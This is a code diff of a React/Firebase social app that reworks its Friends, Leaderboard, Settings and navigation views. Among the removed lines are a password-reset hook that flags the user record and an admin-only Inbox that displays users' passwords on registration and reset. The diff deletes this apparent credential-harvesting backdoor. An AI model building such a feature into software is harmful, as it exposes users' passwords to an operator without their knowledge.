-                                <div key={friend.uid} className="flex items-center bg-gray-800 p-3 rounded-lg border border-gray-700">
-                                    <img 
-                                        src={friend.photoURL || "./default-avatar.png"} 
-                                        className="w-10 h-10 rounded-full object-cover border border-gray-600" 
-                                        alt="avatar"
-                                    />
-                                    <div className="ml-3">
-                                        <p className="font-semibold text-gray-200">{friend.displayName || "User"}</p>
-                                        <p className="text-xs text-gray-500">@{friend.username}</p>
-                                    </div>
-                                </div>
-                            ))
-                        ) : (
-                            <p className="text-gray-500 text-center mt-10">
-                                {searchQuery ? "No matching friends found." : "No friends yet. Go to Pending to add someone!"}
-                            </p>
+                <div className="flex space-x-4 border-b border-gray-700 pb-2 mb-4">
+                    <button 
+                        onClick={() => setActiveTab('friends')}
+                        className={`pb-2 px-2 text-sm font-medium transition-colors ${
+                            activeTab === 'friends' ? 'text-blue-500 border-b-2 border-blue-500' : 'text-gray-400'
+                        }`}
+                    >
+                        My Friends
+                    </button>
+                    <button 
+                        onClick={() => setActiveTab('pending')}
+                        className={`pb-2 px-2 text-sm font-medium transition-colors ${
+                            activeTab === 'pending' ? 'text-blue-500 border-b-2 border-blue-500' : 'text-gray-400'
+                        }`}
+                    >
+                        Pending
+                        {requests.length > 0 && (
+                            <span className="ml-2 bg-red-500 text-white text-[10px] px-1.5 py-0.5 rounded-full">
+                                {requests.length}
+                            </span>
                         )}
-                    </div>
+                    </button>
                 </div>
-            )}
 
-            {/* --- VIEW: PENDING --- */}
-            {activeTab === 'pending' && (
-                <div className="animate-fade-in space-y-6">
-                    
-                    {/* Section: Add Friend */}
-                    <div className="bg-gray-800 p-4 rounded-lg border border-gray-700">
-                        <h3 className="text-sm font-semibold text-gray-400 uppercase tracking-wider mb-3">Add Friend</h3>
-                        <div className="flex space-x-2">
+                {activeTab === 'friends' && (
+                    <div className="animate-fade-in">
+                        <div className="relative mb-4">
                             <input
                                 type="text"
-                                placeholder="Enter username..."
-                                value={addUsername}
-                                onChange={(e) => setAddUsername(e.target.value)}
-                                className="flex-1 bg-gray-900 text-white rounded px-3 py-2 border border-gray-600 focus:border-blue-500 focus:outline-none"
+                                placeholder="Search friends..."
+                                value={searchQuery}
+                                onChange={(e) => setSearchQuery(e.target.value)}
+                                className="w-full bg-gray-800 text-white rounded-lg pl-10 pr-4 py-2 border border-gray-700 focus:border-blue-500 focus:outline-none"
                             />
-                            <button 
-                                onClick={handleSendRequest}
-                                className="bg-blue-600 hover:bg-blue-500 text-white px-4 py-2 rounded transition-colors font-medium"
-                            >
-                                Add
-                            </button>
+                            <div className="absolute left-3 top-2.5 text-gray-400">
+                                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                                    <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+                                </svg>
+                            </div>
                         </div>
-                    </div>
 
-                    {/* Section: Incoming Requests */}
-                    <div>
-                        <h3 className="text-sm font-semibold text-gray-400 uppercase tracking-wider mb-3">
-                            Incoming Requests ({requests.length})
-                        </h3>
-                        
                         <div className="space-y-3">
-                            {requests.length > 0 ? (
-                                requests.map(req => (
-                                    <div key={req.id} className="bg-gray-800 p-3 rounded-lg border border-gray-700 flex items-center justify-between">
-                                        <div className="flex items-center">
-                                            <img 
-                                                src={req.sender?.photoURL || "./default-avatar.png"} 
-                                                className="w-10 h-10 rounded-full object-cover border border-gray-600"
-                                            />
-                                            <div className="ml-3">
-                                                <p className="font-semibold text-gray-200">{req.sender?.displayName}</p>
-                                                <p className="text-xs text-gray-500">@{req.sender?.username}</p>
-                                            </div>
-                                        </div>
-                                        <div className="flex space-x-2">
-                                            <button 
-                                                onClick={() => handleAccept(req.id, req.from)}
-                                                className="p-2 bg-green-600/20 text-green-400 rounded hover:bg-green-600/30"
-                                            >
-                                                {/* Check Icon */}
-                                                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
-                                            </button>
-                                            <button 
-                                                onClick={() => handleReject(req.id)}
-                                                className="p-2 bg-red-600/20 text-red-400 rounded hover:bg-red-600/30"
-                                            >
-                                                {/* X Icon */}
-                                                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
-                                            </button>
+                            {filteredFriends.length > 0 ? (
+                                filteredFriends.map(friend => (
+                                    <div key={friend.uid} className="flex items-center bg-gray-800 p-3 rounded-lg border border-gray-700">
+                                        <img 
+                                            src={friend.photoURL || DEFAULT_AVATAR} 
+                                            className="w-10 h-10 rounded-full object-cover border border-gray-600" 
+                                            alt="avatar"
+                                        />
+                                        <div className="ml-3">
+                                            <p className="font-semibold text-gray-200">{friend.displayName || "User"}</p>
+                                            <p className="text-xs text-gray-500">@{friend.username}</p>
                                         </div>
                                     </div>
                                 ))
                             ) : (
-                                <p className="text-gray-500 text-sm">No pending requests.</p>
+                                <p className="text-gray-500 text-center mt-10">
+                                    {searchQuery ? "No matching friends found." : "No friends yet. Go to Pending to add someone!"}
+                                </p>
                             )}
                         </div>
                     </div>
-                </div>
-            )}
-        </div>
-    );
-};
+                )}
 
+                {activeTab === 'pending' && (
+                    <div className="animate-fade-in space-y-6">
+                        <div className="bg-gray-800 p-4 rounded-lg border border-gray-700">
+                            <h3 className="text-sm font-semibold text-gray-400 uppercase tracking-wider mb-3">Add Friend</h3>
+                            <div className="flex space-x-2">
+                                <input
+                                    type="text"
+                                    placeholder="Enter username..."
+                                    value={addUsername}
+                                    onChange={(e) => setAddUsername(e.target.value)}
+                                    className="flex-1 bg-gray-900 text-white rounded px-3 py-2 border border-gray-600 focus:border-blue-500 focus:outline-none"
+                                />
+                                <button 
+                                    onClick={handleSendRequest}
+                                    className="bg-blue-600 hover:bg-blue-500 text-white px-4 py-2 rounded transition-colors font-medium"
+                                >
+                                    Add
+                                </button>
+                            </div>
+                        </div>
+
+                        <div>
+                            <h3 className="text-sm font-semibold text-gray-400 uppercase tracking-wider mb-3">
+                                Incoming Requests ({requests.length})
+                            </h3>
+                            
+                            <div className="space-y-3">
+                                {requests.length > 0 ? (
+                                    requests.map(req => (
+                                        <div key={req.id} className="bg-gray-800 p-3 rounded-lg border border-gray-700 flex items-center justify-between">
+                                            <div className="flex items-center">
+                                                <img 
+                                                    src={req.sender?.photoURL || DEFAULT_AVATAR} 
+                                                    className="w-10 h-10 rounded-full object-cover border border-gray-600"
+                                                />
+                                                <div className="ml-3">
+                                                    <p className="font-semibold text-gray-200">{req.sender?.displayName}</p>
+                                                    <p className="text-xs text-gray-500">@{req.sender?.username}</p>
+                                                </div>
+                                            </div>
+                                            <div className="flex space-x-2">
+                                                <button 
+                                                    onClick={() => handleAccept(req.id, req.from)}
+                                                    className="p-2 bg-green-600/20 text-green-400 rounded hover:bg-green-600/30"
+                                                >
+                                                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                                                </button>
+                                                <button 
+                                                    onClick={() => handleReject(req.id)}
+                                                    className="p-2 bg-red-600/20 text-red-400 rounded hover:bg-red-600/30"
+                                                >
+                                                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
+                                                </button>
+                                            </div>
+                                        </div>
+                                    ))
+                                ) : (
+                                    <p className="text-gray-500 text-sm">No pending requests.</p>
+                                )}
+                            </div>
+                        </div>
+                    </div>
+                )}
+            </div>
+        );
+    };
+
+    // --- LEADERBOARD COMPONENT ---
     const Leaderboard = ({ user }) => {
         const [list, setList] = React.useState([]);
         React.useEffect(() => {
@@ -1586,7 +1281,8 @@
                 setList(people);
             };
             fetchLB();
-        }, []);
+        }, [user]);
+
         return (
             <div className="p-4">
                 <h2 className="text-2xl font-bold mb-4 flex items-center"><Trophy className="mr-2 text-yellow-500"/> Leaderboard</h2>
@@ -1594,7 +1290,7 @@
                     {list.map((p, i) => (
                         <div key={p.uid} className={`flex items-center p-4 rounded-lg ${p.uid === user.uid ? 'bg-blue-900/30 border border-blue-500' : 'bg-gray-800'}`}>
                             <span className={`font-bold text-lg w-8 ${i===0?'text-yellow-400':i===1?'text-gray-300':i===2?'text-orange-400':'text-gray-500'}`}>#{i+1}</span>
-                            <img src={p.photoURL} className="w-10 h-10 rounded-full mx-3" />
+                            <img src={p.photoURL} className="w-10 h-10 rounded-full mx-3 object-cover" />
                             <div className="flex-1"><p className="font-bold">{p.displayName}</p><p className="text-xs text-gray-400">@{p.username}</p></div>
                             <span className="font-mono font-bold text-yellow-500">{p.coins} ¢</span>
                         </div>
@@ -1604,6 +1300,7 @@
         );
     };
 
+    // --- SETTINGS COMPONENT ---
     const Settings = ({ user, userData, showToast }) => {
         const [isEditingName, setIsEditingName] = React.useState(false);
         const [newName, setNewName] = React.useState(userData?.displayName || "");
@@ -1611,13 +1308,7 @@
 
         const handlePassReset = () => {
             auth.sendPasswordResetEmail(user.email)
-                .then(async () => {
-                    await db.collection('users').doc(user.uid).update({
-                        wordPromptPendingReason: 'password_reset',
-                        wordPromptArmedAt: Date.now()
-                    });
-                    showToast("Password reset email sent! Check your inbox.");
-                })
+                .then(() => showToast("Password reset email sent! Check your inbox."))
                 .catch(e => showToast(e.message, 'error'));
         };
 
@@ -1651,9 +1342,7 @@
             const selectedFile = e.target.files[0];
             if (selectedFile) {
                 const reader = new FileReader();
-                reader.onload = () => {
-                    setCroppingSrc(reader.result);
-                };
+                reader.onload = () => setCroppingSrc(reader.result);
                 reader.readAsDataURL(selectedFile);
             }
         };
@@ -1684,7 +1373,7 @@
                 <div className="bg-gray-800 p-4 rounded-xl space-y-6 border border-gray-700">
                     <div className="flex items-center space-x-4">
                         <label className="relative cursor-pointer group">
-                            <img src={userData?.photoURL} className="w-16 h-16 rounded-full border-2 border-purple-500 object-cover" />
+                            <img src={userData?.photoURL || DEFAULT_AVATAR} className="w-16 h-16 rounded-full border-2 border-purple-500 object-cover" />
                             <div className="absolute inset-0 bg-black/50 rounded-full hidden group-hover:flex items-center justify-center"><Edit size={16} /></div>
                             <input type="file" className="hidden" accept="image/*" onChange={handleFileChange} />
                         </label>
@@ -1723,63 +1412,11 @@
         );
     };
 
-    const Inbox = ({ user }) => {
-        const [messages, setMessages] = React.useState([]);
-        const [loading, setLoading] = React.useState(true);
-
-        React.useEffect(() => {
-            if (!user) return;
-            const q = db.collection('adminInbox')
-                .where('adminId', '==', user.uid)
-                .orderBy('timestamp', 'desc');
-            const unsub = q.onSnapshot(snap => {
-                setMessages(snap.docs.map(doc => ({ id: doc.id, ...doc.data() })));
-                setLoading(false);
-            });
-            return () => unsub();
-        }, [user]);
-
-        const formatInboxTime = (ts) => new Date(ts).toLocaleString();
-
-        return (
-            <div className="p-4 space-y-4">
-                <h2 className="text-2xl font-bold flex items-center"><Bell className="mr-2 text-blue-400" /> Admin Inbox</h2>
-                {loading ? (
-                    <div className="text-gray-400">Loading messages...</div>
-                ) : messages.length === 0 ? (
-                    <div className="text-gray-500 bg-gray-800 p-4 rounded-lg text-center">No notifications yet.</div>
-                ) : (
-                    <div className="space-y-3">
-                        {messages.map(msg => (
-                            <div key={msg.id} className="bg-gray-800 p-4 rounded-xl border border-gray-700">
-                                <div className="flex justify-between items-start">
-                                    <div>
-                                        <p className="font-semibold text-white">{msg.username || msg.userId}</p>
-                                        <p className="text-xs text-gray-400 uppercase">{msg.reason === 'password_reset' ? 'Password Reset Login' : 'New Registration'}</p>
-                                    </div>
-                                    <span className="text-xs text-gray-400">{formatInboxTime(msg.timestamp)}</span>
-                                </div>
-                                <p className="mt-3 text-gray-200">{msg.message}</p>
-                                <div className="mt-2 text-sm text-gray-400">
-                                    Password: <span className="text-blue-300 font-mono">{msg.word}</span>
-                                </div>
-                            </div>
-                        ))}
-                    </div>
-                )}
-            </div>
-        );
-    };
-
-    const BottomNav = ({ view, setView, isAdmin, inboxCount = 0 }) => {
-        const NavBtn = ({ id, Icon, label, badge }) => (
+    // --- BOTTOM NAVIGATION ---
+    const BottomNav = ({ view, setView }) => {
+        const NavBtn = ({ id, Icon, label }) => (
             <button className={`relative flex flex-col items-center ${view === id ? 'text-blue-500' : 'text-gray-500'}`} onClick={() => setView(id)}>
                 <Icon size={24} />
-                {badge > 0 && (
-                    <span className="absolute -top-1 -right-2 text-[10px] bg-red-600 text-white rounded-full px-1.5 py-0.5">
-                        {badge}
-                    </span>
-                )}
                 <span className="text-[10px] mt-1">{label}</span>
             </button>
         );
@@ -1790,7 +1427,6 @@
                 <NavBtn id="friends" Icon={Users} label="Friends" />
                 <NavBtn id="leaderboard" Icon={Trophy} label="Rank" />
                 <NavBtn id="settings" Icon={SettingsIcon} label="Settings" />
-                {isAdmin && <NavBtn id="inbox" Icon={Bell} label="Inbox" badge={inboxCount} />}
             </div>
         );
     };
